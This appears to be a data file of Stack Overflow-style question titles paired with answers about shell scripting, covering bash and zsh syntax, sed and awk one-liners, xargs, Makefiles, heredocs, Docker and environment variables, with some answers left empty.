    "When scripting, what's the difference between #!/usr/bin/perl and #!/usr/bin/env perl?": "One references a common place that perl is installed. The other references a common place that env is installed and asks it what the path to the default perl is.",
    "Google Cloud Shell Editor not loading resources": "",
    "what does @D mean in shell script": "Usually $(command) executes command and replaces $(command) with the output of command. So there must be a file named @D which is executable and located in the search path.\nBut if this is not a shell script but a make file it means:\n$(@D)\nThe directory part of the file name of the target, with the trailing slash removed. If the value of $@ is dir/foo.o then $(@D) is dir. This value is . if $@ does not contain a slash.",
    "How to iterate through each letter in a string in Unix Shell [duplicate]": "Combining answers from dtmilano and patrat would give you:\nread -p \"Please enter a word: \" word\n\nfor i in $(seq 1 ${#word})\ndo\n echo \"Letter $i: ${word:i-1:1}\"\ndone\n${#word} gives you the length of the string.",
    "how to 'ls' another directory in unix script?": "Give the directory as the argument to ls:\nls /var/lib/judgem/records",
    "how to 'break' out of an if loop in bash?": "if statements are not \"loops\", so it doesn't make sense to break out of them. If you want one of your blocks to be a no-op, you can use the built-in : command, which simply does nothing:\nif [[ $ans1_1 = y ]]; then\n    fedoraDeps\nelif [[ $ans1_1 = n ]]; then\n    :\nelse\n    echo \"Answer 'y' or 'n'\"\nfi",
    "How does \"<<\" operator work in linux shell?": "A command with the << operator will do the following things :\nLaunch the program specified in the left of the operator, cat for instance.\nGrab user input, including newlines, until what is specified on the right of the operator is met on one line, EOF for instance\nSend all that have been read except the EOF value to the standard input of the program on the left.\ncat << EOF\nHello\nWorld\nEOF\nWill send \"Hello\nWorld\"\nTo the standard input of cat.\nIt is the same as doing this:\ncat < file\nWith file containing :\nHello\nWorld",
    "Capturing the PID of a background process started by a Makefile": "Just leave a single ampersand, without a semicolon after it:\nrun: venv\n    @\"${PYTHON}\" \"${APP}/manage.py\" runserver 80 & echo \"$$!\" > \"${LOGDIR}/django.pid\"\nAmpersand acts as command separator in the same way as a semicolon:\n<command> & <command>",
    "mongodb: how to debug map/reduce on mongodb shell": "It seems that print() statements in reduce functions are written to the log file, rather than the shell. So check your log file for your debug output.\nYou can specify the log file by using a --logpath D:\\path\\to\\log.txt parameter when starting the mongod process.",
    "What is the difference between \"./somescript.sh\" and \". ./somescript.sh\"": "./setup.sh runs the script, a new shell will be started that runs the script. That new shell cannot affect the parent shell that started the script.\n. ./setup.sh is a shorthand for source ./setup.sh and it will run the script in the current shell, instead of starting a new shell to run it. This means the script can alter the behavior of the current shell, e.g. set new environment variables.",
    "Moving All Files From Directories One Step Up": "The typical way of moving files all files matching a particular expression is\nmv 1/*.masked targetDir\nwhere targetDir could be ..\nIf you want to move it from directories 1,2,3 then you can do something like\nmv */*.masked targetDir\nOr, if you want to specifically move it from numbered directories, you can just run something like\nmv [0-9][0-9]/*.masked targetDir",
    "POSIX: abcdef to ab bc cd de ef": "Try:\n$ echo \"abcd 10001.\" | awk '{for(i=1;i<length($0);i++) print substr($0,i,2)}'\nab\nbc\ncd\nd \n 1\n10\n00\n00\n01\n1.",
    "How to properly start a Gnome-Shell extension via command line?": "According to some answers around the internet, sending SIGHUP to the gnome-shell process restarts it (i.\u202fe. killall -HUP gnome-shell), but I haven\u2019t been able to find a clear source on this and couldn\u2019t find the signal handling in the code. What I do know is that this should be exactly equivalent to Alt+F2 r:\nbusctl --user call org.gnome.Shell /org/gnome/Shell org.gnome.Shell Eval s 'Meta.restart(\"Restarting\u2026\")'\nBecause apart from a gettext call on the message, this is exactly what Alt+F2 r is bound to (see runDialog.js \u2013 search for _restart).\nJanuary 2022 update: Since Gnome 41, calling Eval is restricted and requires \u201cunsafe mode\u201d to be enabled, so by default this will no longer work. I\u2019m not currently aware of a replacement for this particular usage.",
    "Bash script - Auto fill answer": "I would pass a here document to stdin:\n./script.sh install <<EOF\ny\n2\n1\nn\nn\nEOF\nIf you want it on one line, you can also use echo:\necho -e \"y\\n2\\n1\\nn\\nn\" | ./script.sh install\nHowever, I prefer the here document solution since it is IMHO more readable.",
    "How to log the time taken for a unix command?": "Use the time command (details):\ntime your_prog\nIf time does not fit for you, I would try to log the output of date (details) before and after the execution of your program, e.g.\ndate > log.txt; your_prog; date >> log.txt\nFinally, you can also add some formatting (NOTE: inspired by Raze2dust's answer):\necho \"started at: $(date)\" > log.txt; your_prog; echo \"ended at: $(date)\" >> log.txt",
    "unoconv not working on ubuntu 12.04 server": "I fixed the above issue by installing latest version of unoconv. I tried updating libreoffice and installing complete version, neither helped.\nI was using unoconv 0.3, and the latest available version is 0.6. So I installed the latest one and it solved the issue.\nHere is the steps i followed:\napt-get remove --purge unoconv (remove the old unoconv first)\ngit clone https://github.com/dagwieers/unoconv (download latest version of unoconv from github.)\nnow cd to unoconv directory and do sudo make install\nNote: pls do git clone, dont download the tar file. In my case the installation failed when I downloaded the tar.",
    "using readline() for completion": "Filename completion is a built-in feature of readline, you don't need to populate filename lists etc. Here with readline 6.1 the following program allows filename completion by default.\n#include <stdio.h>\n#include <stdlib.h>\n\n#include <readline/readline.h>\n#include <readline/history.h>\n\nint main()\n{\n    printf( \"%s\\n\", readline( \"test> \" ) );\n    return 0;\n}\nThere are ways to customize this mechanism, e.g. you can specify some functions like rl_filename_quoting_function and rl_filename_dequoting_function to help readline provide proper filename quotation for your application.\nI think you need to specify your version of readline if this doesn't work for you. /etc/inputrc contents should be examined as well. Do you have bash, which uses readline? Does the filename completion work there as expected? Anyway, info readline is a very good documentation provided you can use info itself :) If not, look at Programming with GNU Readline.",
    "Delphi notification when a file gets updated": "You can detect changes in your temporary files (or any file) using the TJvChangeNotify component from the JEDI JVCL collection.",
    "BASH: how to perform arithmetic on numbers in a pipe": "echo 1 2 3 4 5|{\n  read line; \n  for i in $line;\n  do\n    echo -n \"$((i * i)) \"; \n  done; \n  echo\n}\nThe {} creates a grouping. You could instead create a script for that.",
    "Pad a string to a certain length with a chosen character (or hexcode) in Bash?": "For strings without spaces\nUse printf to pad with spaces, then replace the spaces with a symbol of your choice. Some examples:\nprintf %10s AABB | tr ' ' X prints XXXXXXAABB.\nprintf %-10s AABB | tr ' ' X prints AABBXXXXXX.\nTo insert non-printable symbols instead of X, you can pass an octal escape sequence to tr. printf can convert hexadecimal numbers into octal ones:\nprintf %10s AABB | tr ' ' \\\\$(printf %o 0x1f) prints the bytes 1f 1f 1f 1f 1f 1f 41 41 42 42 (can be confirmed by piping through od -tx1 -An).\nFor strings with spaces\nstr=AABB\nyes \"\" | head -n $((10-\"${#str}\")) | tr \\\\n X\nprintf %s \"$str\"\nSwap the last two lines to insert padding at the right (like %-10s). Just like before, you can replace X with \\\\$(printf %o 0x1f) to insert non-printable characters.",
    "'If' statements and one line Python scripts from the command line": "One option to work around this limitation is to specify the command with the $'string' format using the newline escape sequence \\n.\npython -c $'import re\\nif True: print \"HELLO\";'\nNote: this is supported by shells, such as Bash and Z shell (zsh), but it is not valid POSIX Bourne shell (sh).\nAs mentioned by slaadvak, there are some other workarounds here: Executing Python multi-line statements in the one-line command-line",
    "Modifying ini files using shell script": "I personally use a more elaborated sed command, as the same option might appear in several different sections:\nsh$ sed -i.bak '/^\\[test]/,/^\\[/{s/^foo[[:space:]]*=.*/foo = foobarbaz/}' test1.ini\n#       ^^^^^^  ^^^^^^^^^^^^^^^^ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n#    make a       in the right         perform the substitution\n#   *backup*       section                as you want\nAnd as a safety net, I would add:\nsh$ diff test1.ini{,.bak}\n2c2\n< foo = foobarbaz\n---\n> foo=bar",
    "Extract part of a filename shell script": "You can do it natively in bash as follows:\nfilename=coffee_1234.freqdist\ntmp=${filename#*_}\nnum=${tmp%.*}\necho \"$num\"\nThis is a pure bash solution. No external commands (like sed) are involved, so this is faster.\nAppend these numbers to a file using:\necho \"$num\" >> file\n(You will need to delete/clear the file before you start your loop.)",
    "How to join columns of two files in unix system": "Just use the paste command. Use it like this : paste file1 file2",
    "Pipe the output from three echo statement to mail": "Your requirement is not completely clear, but try this\n{\n    echo \"Total items: `echo $QUERY1 | awk '{print $1}'`\"\n    echo \"Total Error: `echo $QUERY1 | awk '{print $2}'`\"\n    echo \"Percentage: $QUERY2\"\n} | mail -s \"subject\" toUser1@xyz.com,toUser2@abc.com\nThe { .. } pair creates a process group, and all std-output is redirected into the 1 | (pipe), which connects to the std-in of your mail program.\nYou may need to use mailx, -s specifies subject, which I see from your other question on this topic that you seem to understand.\nAlso sendmail will need to be running and properly configured for any mail to be delivered from the machine that you execute this script.\nIHTH\nEdit: 2015-11-07\nJust got a 'nice answer' star for this, and on on review, I'm surprised that I didn't comment on excessive use of processes. For this case, this can be reduced to one call to awk, i.e.\nawk -v q1=\"$QUERY1\" -v q2=\"$QUERY2\" \\\n 'END {\n    split(q1,q1arr)\n    print \"Total items: \" q1arr[1] \\\n          \"Total Error: \" q1arr[2] \\\n          \"Percentage: \" q2\n}' /dev/null \\\n| mail -s \"subject\" toUser1@xyz.com,toUser2@abc.com\nOr for the one-liner crowd ;-), that is\nawk -v q1=\"$QUERY1\" -v q2=\"$QUERY2\" 'END {split(q1,q1arr);print \"Total items: \" q1arr[1] \"\\nTotal Error: \" q1arr[2] \"\\nPercentage: \" q2 }' /dev/null | mail -s \"subject\" toUser1@xyz.com,toUser2@abc.com\nThe { .. } aren't needed in this case, as there is only one process connecting to the pipe.\nFor a case like a summary report being sent once a day, the original code is completely usable (but non-optimal). However, coding non-optimally leads to bad habits. Calling 5 processes when one will suffice in a loop that runs 1000s of times in a day, will consume compute resources unnecessarily.\nFinally, as the o.p. didn't include any sample data, the code is only lightly tested.",
    "Run Linux commands from Qt4": "QProcess p;\np.start( /* whatever your command is, see the doc for param types */ );\np.waitForFinished(-1);\n\nQString p_stdout = p.readAllStandardOutput();\nQString p_stderr = p.readAllStandardError();",
    "how to Enter data from keyboard in shell programming": "You can use \"read\" :\n$ cat ./test.sh\n#!/bin/sh\necho -n \"enter the value : \"\nread my_var\n\necho \"The value is : $my_var\"\nAnd, executing the script :\n$ sh ./test.sh\nenter the value : 145\nThe value is : 145",
    "\"Exec format error\" with docker run command": "The \"Exec format error\" was simply because I was copying the binary file built on OSX/MacOS into the Docker image and trying to run that binary file in the Linux container. That don't work.\nHere is the Dockerfile that worked for me:\nFROM golang:latest\n\nRUN mkdir -p /app\n\nWORKDIR /app\n\nCOPY . .\n\nENV GOPATH /app\n\nRUN go install huru\n\nENTRYPOINT /app/bin/huru\nand my project structure like so on my host fs:\n$GOPATH/\n      src/\n        huru/\n      .dockerignore\n      Dockerfile\nI run:\ndocker build -t foo .\ndocker run foo\nmy .dockerignore file contains:\n.vscode\nbin\npkg",
    "JAVA_HOME is not defined correctly in Groovy": "Updating JAVA_HOME or PATH environment variables is ok for individual users, but to fix it system-wide, just create the missing symlink. For me, it went like this:\n$ groovy --version\ngroovy: JAVA_HOME not defined, can't execute: /usr/lib/jvm/default-java/bin/java\n\n$ cd /usr/lib/jvm\n$ ls -log\nlrwxrwxrwx 1   20 Nov  1 14:17 java-1.8.0-openjdk-amd64 -> java-8-openjdk-amd64\ndrwxr-xr-x 7 4096 Feb  3 02:36 java-8-openjdk-amd64\n\n$ sudo ln -s java-8-openjdk-amd64/ default-java\n$ groovy --version\nGroovy Version: 2.4.8 JVM: 1.8.0_151 Vendor: Oracle Corporation OS: Linux",
    "Zsh: Test whether a file matching a pattern exists": "Yes, there is in zsh. (setopt extendedglob required for the (#q\u2026) form glob qualifier notation.)\nif [[ -n *PATTERN*(#qN) ]]; then\n    this-and-that\nfi\nThere are some descriptions and a similar example in zsh's documents \"CONDITIONAL EXPRESSIONS\" and \"Glob Qualifiers\":\nFilename generation is not performed on any form of argument to conditions. However, it can be forced in any case where normal shell expansion is valid and when the option EXTENDED_GLOB is in effect by using an explicit glob qualifier of the form (#q) at the end of the string. A normal glob qualifier expression may appear between the \u2018q\u2019 and the closing parenthesis; if none appears the expression has no effect beyond causing filename generation. The results of filename generation are joined together to form a single word, as with the results of other forms of expansion.\nThis special use of filename generation is only available with the [[ syntax. If the condition occurs within the [ or test builtin commands then globbing occurs instead as part of normal command line expansion before the condition is evaluated. In this case it may generate multiple words which are likely to confuse the syntax of the test command.\nFor example,\n[[ -n file*(#qN) ]]\nproduces status zero if and only if there is at least one file in the current directory beginning with the string \u2018file\u2019. The globbing qualifier N ensures that the expression is empty if there is no matching file.\n-- zshmisc(1): CONDITIONAL EXPRESSIONS\n--\nIf the option EXTENDED_GLOB is set, a different syntax for glob qualifiers is available, namely \u2018(#qx)\u2019 where x is any of the same glob qualifiers used in the other format. The qualifiers must still appear at the end of the pattern. However, with this syntax multiple glob qualifiers may be chained together. They are treated as a logical AND of the individual sets of flags. Also, as the syntax is unambiguous, the expression will be treated as glob qualifiers just as long any parentheses contained within it are balanced; appearance of \u2018|\u2019, \u2018(\u2019 or \u2018~\u2019 does not negate the effect. Note that qualifiers will be recognised in this form even if a bare glob qualifier exists at the end of the pattern, for example \u2018*(#q*)(.)\u2019 will recognise executable regular files if both options are set; however, mixed syntax should probably be avoided for the sake of clarity. Note that within conditions using the \u2018[[\u2019 form the presence of a parenthesised expression (#q...) at the end of a string indicates that globbing should be performed; the expression may include glob qualifiers, but it is also valid if it is simply (#q). This does not apply to the right hand side of pattern match operators as the syntax already has special significance.\n-- zshexpn(1): Expansion, Filename Generation, Glob Qualifiers",
    "How to get the line count of a large file, at least 5G": "Step 1: head -n filename > newfile // get the first n lines into newfile\uff0ce.g. n =5\nStep 2: Get the huge file size, A\nStep 3: Get the newfile size,B\nStep 4: (A/B)*n is approximately equal to the exact line count.\nSet n to be different values,done a few times more, then get the average.",
    "Linux command to run script at intervals": "You could try something like this:\nwhile true; do\n  python2.5 /home/me/web/gae/google_appengine/dev_appserver.py /home/me/web/gae/APPLICATION/trunk &\n  sleep 10\n  kill $!\ndone\nI.e.: Loop forever (while true), start the python script in background, wait for 10 seconds (sleep 10) and kill the background process (kill $!).",
    "suppressing messages while running sql queries in a script": "You have to add the uppercase S option to sqlplus.\nThe help message (of sqlplus that comes with Oracle 11.2.0.4.0) specifies:\n-S    Sets silent mode which suppresses the display of\n      the SQL*Plus banner, prompts, and echoing of\n      commands.\nWith something like\n$ sqlplus -S /nolog << EOF\nconnect user/pswd@databse\nset serveroutput on\nset heading off\nset feedback off\nexec package.procedure($1); -- procedure that calls DBMS_OUTPUT procedures ...\nselect 2 from dual;\n-- ...\nexit;\nEOF\nyou only get the output from the DBMS_OUTPUT buffer and the results from select statements.",
    "How to make shell output redirect (>) write while script is still running?": "You need to flush the output sys.stdout.flush() (or smth) if you want to see it immediately. See this",
    "How to make the Shebang be able to choose the correct Python interpreter between python3 and python3.5": "No need to bring in separate shell and python scripts, a single file can be both!\nReplace your shebang line with this sequence:\n#!/bin/sh\n\n# Shell commands follow\n# Next line is bilingual: it starts a comment in Python, and is a no-op in shell\n\"\"\":\"\n\n# Find a suitable python interpreter (adapt for your specific needs) \nfor cmd in python3.5 python3 /opt/myspecialpython/bin/python3.5.99 ; do\n   command -v > /dev/null $cmd && exec $cmd $0 \"$@\"\ndone\n\necho \"OMG Python not found, exiting!!!!!11!!eleven\" >2\n\nexit 2\n\n\":\"\"\"\n# Previous line is bilingual: it ends a comment in Python, and is a no-op in shell\n# Shell commands end here\n# Python script follows (example commands shown)\n\nimport sys\nprint (\"running Python!\")\nprint (sys.argv)",
    "Connect to a different database in django shell": "You could select database in your query with using() ORM's method:\n# This will hit a model in your default DB:\nModel.objects.using('default').all()\n\n# And this will hit a model in your slave DB:\nModel.objects.using('slave').all()",
    "How to have changes in ~/.byobu/.tmux.conf take effect without restarting byobu": "Just press F5 to refresh Byobu!\nFull disclosure: I am the author and maintainer of Byobu.",
    "Set and export multiple environment variables to the same value in bash": "export {LC_CTYPE,LANG,LC_ALL}=C",
    "Building a batch file to run exe files sequentially": "You actually don't need to do anything special to make this happen; batch files are synchronous by default, so execution of the batch file will pause when an executable is launched, and resume when it exits. Something as simple as this should do:\n@echo off\nREM \"@echo off\" prevents each line from being printed before execution,\nREM and is optional\nREM \"REM\" introduces a comment line\nD:\\MyDriver.exe\nD:\\YouDriver.exe\nD:\\MySoftware.exe\nOf course, if you're interested in checking the return values of the programs, to see whether they succeeded or failed to install (assuming the installer provides that information), then things become slightly more complicated; if that's what you need, mention it in a comment, and I'll expand my answer accordingly.",
    "How to initiate array element to 0 in bash?": "Your example will declare/initialize an empty array.\nIf you want to initialize array members, you do something like this:\ndeclare -a MY_ARRAY=(0 0 0 0) # this initializes an array with four members\nIf you want to initialize an array with 100 members, you can do this:\ndeclare -a MY_ARRAY=( $(for i in {1..100}; do echo 0; done) )\nKeep in mind that arrays in bash are not fixed length (nor do indices have to be consecutive). Therefore you can't initialize all members of the array unless you know what the number should be.",
    "Delete lines before and after a match in bash (with sed or awk)?": "an awk one-liner may do the job:\nawk '/PINITIAL BALANCE/{for(x=NR-2;x<=NR+2;x++)d[x];}{a[NR]=$0}END{for(i=1;i<=NR;i++)if(!(i in d))print a[i]}' file\ntest:\nkent$  cat file\n######\nfoo\nD28/10/2011\nT-3.48\nPINITIAL BALANCE\nM\nx\nbar\n######\nthis line will be kept\nhere\ncomes\nPINITIAL BALANCE\nagain\nblah\nthis line will be kept too\n########\n\nkent$  awk '/PINITIAL BALANCE/{for(x=NR-2;x<=NR+2;x++)d[x];}{a[NR]=$0}END{for(i=1;i<=NR;i++)if(!(i in d))print a[i]}' file\n######\nfoo\nbar\n######\nthis line will be kept\nthis line will be kept too\n########\nadd some explanation\n  awk '/PINITIAL BALANCE/{for(x=NR-2;x<=NR+2;x++)d[x];}   #if match found, add the line and +- 2 lines' line number in an array \"d\"\n      {a[NR]=$0} # save all lines in an array with line number as index\n      END{for(i=1;i<=NR;i++)if(!(i in d))print a[i]}' #finally print only those index not in array \"d\"\n     file  # your input file",
    "Cannot find MySQL -- get \"command not found\" error when trying to access MySQL from command line": "A MySQL server is not a MySQL client.\nCheck if MySQL is running by executing this command:\nps aux | grep mysql | grep -v grep\nAnd install the MySQL client:\nsudo apt-get install mysql-client # Or your distribution command",
    "How to shield the kill output [duplicate]": "The message isn't coming from either kill or the background command, it's coming from bash when it discovers that one of its background jobs has been killed. To avoid the message, use disown to remove it from bash's job control:\nsleep 20 &\nPID=$!\ndisown $PID\nkill -9 $PID",
    "unix command to find most recent directory created": "This is the answer to the question I think you are asking.\nWhen I deal with many directories that have date/time stamps in the name, I always take the approach that you have which is YYYYMMDD - the great thing about that is that the date order is then also the alphabetical order. In most shells (certainly in bash and I am 90% sure of the others), the '*' expansion is done alphabetically, and by default 'ls' return alphabetical order. Hence\n    ls | head -1\n    ls | tail -1\nGive you the earliest and the latest dates in the directory.\nThis can be extended to only keep the last 5 entries etc.",
    "cat a file inside a shell function": "Qiang:\nRemove the spaces in front of EOF (so it's on a line by itself and not indented).",
    "How to redirect all stderr in bash?": "Use the exec builtin in bash:\nexec 2> /tmp/myfile",
    "Zshell starts up with exit status of 1 after uninstalling RVM": "Found it! I was looking at the zshell sourceforge page, and I noticed that zsh reads from five different files at startup:\n$ZDOTDIR/.zshenv\n$ZDOTDIR/.zprofile\n$ZDOTDIR/.zshrc\n$ZDOTDIR/.zlogin\n$ZDOTDIR/.zlogout\nI found a .zlogin file on my system that contained some rvm-related code. I've deleted the code, and the problem is solved!",
    "echo to stdout and append to file": "Something like this?\necho \"all done creating tables\" | tee -a  \"${SUMAN_DEBUG_LOG_PATH}\"",
    "How to prompt user for input in shell script? [duplicate]": "You need to use the read built-in available in bash and store the multiple user inputs into variables,\nread -p \"Enter the files you would like to install: \" arg1 arg2 arg3\nGive your inputs separated by space. For example, when running the above,\nEnter the files you would like to install: spreadsheet json diffTool\nnow each of the above inputs are available in the variables arg1,arg2 and arg3\nThe above part answers your question in way, you can enter the user input in one go space separated, but if you are interested in reading multiple in a loop, with multiple prompts, here is how you do it in bash shell. The logic below get user input until the Enter key is pressed,\n#!/bin/bash\n\ninput=\"junk\"\ninputArray=()\n\nwhile [ \"$input\" != \"\" ] \ndo \n   read -p \"Enter the files you would like to install: \" input\n   inputArray+=(\"$input\")\ndone\nNow all your user inputs are stored in the array inputArray which you can loop over to read the values. To print them all in one shot, do\nprintf \"%s\\n\" \"${inputArray[@]}\"\nOr a more proper loop would be to\nfor arg in \"${inputArray[@]}\"; do\n    [ ! -z \"$arg\" ] && printf \"%s\\n\" \"$arg\"\ndone\nand access individual elements as \"${inputArray[0]}\", \"${inputArray[1]}\" and so on.",
    "What does \"${!var}\" mean in shell script? [duplicate]": "This is called variable indirect expansion.\n$ hello=\"this is some text\"   # we set $hello\n$ var=\"hello\"                 # $var is \"hello\"\n$ echo \"${!var}\"              # we print the variable linked by $var's content\nthis is some text\nAs you see, it is a way to define \"variable variables\". That is, to use variables whose content is the name of another variable.\nFrom Bash Reference Manual \u2192 3.5.3 Shell Parameter Expansion:\nIf the first character of parameter is an exclamation point (!), and parameter is not a nameref, it introduces a level of variable indirection. Bash uses the value of the variable formed from the rest of parameter as the name of the variable; this variable is then expanded and that value is used in the rest of the substitution, rather than the value of parameter itself. This is known as indirect expansion. If parameter is a nameref, this expands to the name of the variable referenced by parameter instead of performing the complete indirect expansion. The exceptions to this are the expansions of ${!prefix*} and ${!name[@]} described below. The exclamation point must immediately follow the left brace in order to introduce indirection.",
    "How to set environment variables of parent shell in Python? [duplicate]": "This isn't possible.\nChild processes inherit their environments from their parents rather than share them. Therefore any modifications you make to your environment will be reflected only in the child (python) process. Practically, you're just overwriting the dictionary the os module has created based on your environment of your shell, not the actual environment variables of your shell.\nhttps://askubuntu.com/questions/389683/how-we-can-change-linux-environment-variable-in-python\nWhy can't environmental variables set in python persist?",
    "Bash terminal output - highlight lines containing some text": "For a simple workaround, pipe it through grep --color to turn some words red.\nAdd a fallback like ^ to print lines which do not contain any matches otherwise.\ngrep --color -e 'FAIL' -e '^' <<<$'Foo\\nBar FAIL Baz\\nIck'\nGrep output with multiple Colors? describes a hack for getting multiple colors if you need that.",
    "Auditd - auditctl rule to monitor dir only (not all sub dir and files etc..) [closed]": "A watch is really a syscall rule in disguise. If you place a watch on a directory, auditctl will turn it into:\n-a exit,always  -F dir=/home/raven/public_html -F perm=war -F key=raven-pubhtmlwatch\nThe -F dir field is recursive. However, if you just want to watch the directory entries, you can change that to -F path.\n-a exit,always  -F path=/home/raven/public_html -F perm=war -F key=raven-pubhtmlwatch\nThis is not recursive and just watches the inode that the directory occupies.\nI had to add the rule manually in: /etc/audit/audit.rules\nthen restart auditd using\n/etc/init.d/auditd restart\nnow the rules are added and it works great! All credit goes to Steve @ redhat who answered my question in the audit mailing list: https://www.redhat.com/archives/linux-audit/2013-September/msg00057.html",
    "Find out how many SSH connections currently exist [closed]": "Scan the process list for sshd: .\nEstablished connections look something like this: sshd: <username>\u2026\nps -A x | grep [s]shd\nshould work for you.",
    "PHP log file color": "",
    "Substituting a single line with multiple lines of text": "$ sed '/keyword/c\\\n> Inserted is new first line\\\n> Inserted is new second line\\\n> Inserted is new third line' input.txt\n\nThis is Line 1\nInserted is new first line\nInserted is new second line\nInserted is new third line\nThis is Line 3\n$ and > are bash prompt",
    "Using sed to search and replace an ip address in a file": "If your version of sed supports extended regular expressions (the -r option), you could do something like this (which is similar to what you have in your grep statement). Also note $newip is outside the single quotes to allow the shell to replace it.\nsed -r 's/(\\b[0-9]{1,3}\\.){3}[0-9]{1,3}\\b'/\"$newip\"/\nBTW this solution still matches strings that do not represent IP addresses. See this site under IP Adresses for more complex solutions.",
    "How can I tell the resolution of scanned PDF from within a shell script?": "pdfimages has a -list option that gives the height width in pixels and also y-ppi and x-ppi.\n pdfimages -list tmp.pdf           \npage   num  type   width height color comp bpc  enc interp  object ID x-ppi y-ppi size ratio\n--------------------------------------------------------------------------------------------\n   1     0 image    3300  2550  gray    1   1  ccitt  no       477  0   389   232  172K  17%\n   2     1 image    3300  2550  gray    1   1  ccitt  no         3  0   389   232  103K  10%\n   3     2 image    3300  2550  gray    1   1  ccitt  no         7  0   389   232  236K  23%\n   4     3 image    3300  2550  gray    1   1  ccitt  no        11  0   389   232  210K  20%\n   5     4 image    3300  2550  gray    1   1  ccitt  no        15  0   389   232  250K  24%\n   6     5 image    3300  2550  gray    1   1  ccitt  no        19  0   389   232  199K  19%\n   7     6 image    3300  2550  gray    1   1  ccitt  no        23  0   389   232  503K  49%\n   8     7 image    3300  2550  gray    1   1  ccitt  no        27  0   389   232  154K  15%\n   9     8 image    3300  2550  gray    1   1  ccitt  no        31  0   389   232 21.5K 2.1%\n  10     9 image    3300  2550  gray    1   1  ccitt  no        35  0   389   232  286K  28%\n  11    10 image    3300  2550  gray    1   1  ccitt  no        39  0   389   232 46.8K 4.6%\n  12    11 image    3300  2550  gray    1   1  ccitt  no        43  0   389   232 55.5K 5.4%\n  13    12 image    3300  2550  gray    1   1  ccitt  no        47  0   389   232 35.0K 3.4%\n  14    13 image    3300  2550  gray    1   1  ccitt  no        51  0   389   232 26.9K 2.6%\n  15    14 image    3300  2550  gray    1   1  ccitt  no        55  0   389   232 66.5K 6.5%\n  16    15 image    3300  2550  gray    1   1  ccitt  no        59  0   389   232 73.9K 7.2%\n  17    16 image    3300  2550  gray    1   1  ccitt  no        63  0   389   232 47.0K 4.6%\n  18    17 image    3300  2550  gray    1   1  ccitt  no        67  0   389   232 30.1K 2.9%\n  19    18 image    3300  2550  gray    1   1  ccitt  no        71  0   389   232 70.3K 6.8%\n  20    19 image    3300  2550  gray    1   1  ccitt  no        75  0   389   232 46.0K 4.5%\n  21    20 image    3300  2550  gray    1   1  ccitt  no        79  0   389   232 28.9K 2.8%\n  22    21 image    3300  2550  gray    1   1  ccitt  no        83  0   389   232 72.7K 7.1%\n  23    22 image    3300  2550  gray    1   1  ccitt  no        87  0   389   232 47.5K 4.6%\n  24    23 image    3300  2550  gray    1   1  ccitt  no        91  0   389   232 30.1K 2.9%",
    "Need alternative to readarray/mapfile for script on older version of Bash": "You can loop over your input and append to the array:\n$ while IFS= read -r line; do arr+=(\"$line\"); done < <(printf '%d\\n' {0..5})\n$ declare -p arr\ndeclare -a arr='([0]=\"0\" [1]=\"1\" [2]=\"2\" [3]=\"3\" [4]=\"4\" [5]=\"5\")'\nOr, for your specific case:\nwhile IFS= read -r line; do\n    drives+=(\"$line\")\ndone < <(lsblk --nodeps -o name,serial,size | grep \"sd\")\nSee the BashFAQ/001 for an excellent explanation why IFS= read -r is a good idea: it makes sure that whitespace is conserved and backslash sequences not interpreted.",
    "Pass a variable from python to shell script": "There are two built-in python modules you can use for this. One is os and the other is subprocess. Even though it looks like you're using subprocess, I'll show both.\nHere's the example bash script that I'm using for this.\ntest.sh\necho $1\necho $2\nUsing subprocess\n>>> import subprocess\n>>> subprocess.call(['bash','test.sh','foo','bar'])\nfoo\nbar\nThis should be working, can you show us the error or output that you're currently getting.\nUsing os\n>>> import os\n>>> os.system('bash test.sh foo bar')\nfoo\nbar\n0\nNote the exit status that os prints after each call.",
    "How can I print a newline as \\n in Bash?": "Here's my solution:\nsed 's/$/\\\\n/' | tr -d '\\n'",
    "Bash script - determine vendor and install system (apt-get, yum etc)": "You don't really need to check for vendor as they may decide to change packaging system (unlikely but conceptually, you would have to ensure that for each distro you test for, you try the right package manager command). All you have to do is test for the installation itself:\n  YUM_CMD=$(which yum)\n  APT_GET_CMD=$(which apt-get)\n  OTHER_CMD=$(which <other installer>)\nand then possibly sort them in your preference order:\n if [[ ! -z $YUM_CMD ]]; then\n    yum install $YUM_PACKAGE_NAME\n elif [[ ! -z $APT_GET_CMD ]]; then\n    apt-get $DEB_PACKAGE_NAME\n elif [[ ! -z $OTHER_CMD ]]; then\n    $OTHER_CMD <proper arguments>\n else\n    echo \"error can't install package $PACKAGE\"\n    exit 1;\n fi\nyou can take a look at how gentoo (or framework similar to yocto or openembedded) provide approach to even get the source code (with wget) and build from scratch if you want a failsafe script.",
    "How do I execute a PHP shell script as an Automator action on Mac OS X": "",
    "Updating Existing IPs from a Security Group in AWS using aws cli": "",
    "How to use substitution in xargs?": "How to do the substitution rightly?\nYou cannot use substitution in the way you are trying to do because {} is not a bash variable (only part of xargs syntax), therefore bash cannot do substitution on it.\nA better way to it would be to create a full bash command and provide it as and argument to xargs (e.g. xargs -0 -i bash -c 'echo cp \"$1\" \"${1%.txt}.dat\"' - '{}' - this way you can do bash substitution).\nI am curious about that xargs will do things parallel when for loop do things one by one?\nYes, for loop will do things sequently but by default xargs always will. However, you can use -P option of xargs to parallelize it, from xargs man pages:\n   -P max-procs, --max-procs=max-procs\n          Run up to max-procs processes at a time; the default is 1.  If max-procs is 0, xargs will run as many processes as possible at a time.  Use the -n option or the -L  option\n          with  -P;  otherwise  chances are that only one exec will be done.  While xargs is running, you can send its process a\nSIGUSR1 signal to increase the number of commands to run simultaneously, or a SIGUSR2 to decrease the number. You cannot increase it above an implementation-defined limit (which is shown with --show-limits). You cannot de\u2010 crease it below 1. xargs never terminates its commands; when asked to decrease, it merely waits for more than one existing command to terminate before starting another.\nPlease  note that it is up to the called processes to properly manage parallel access to shared resources.  For example, if\nmore than one of them tries to print to stdout, the ouptut will be produced in an indeterminate order (and very likely mixed up) unless the processes collaborate in some way to prevent this. Using some kind of locking scheme is one way to prevent such problems. In general, using a locking scheme will help ensure correct output but reduce performance. If you don't want to tolerate the performance difference, simply arrange for each process to produce a separate output file (or otherwise use separate resources).",
    "Python terminal output width": "For numpy, it turns out you can enable the full output by setting\nnp.set_printoptions(suppress=True,linewidth=np.nan,threshold=np.nan).",
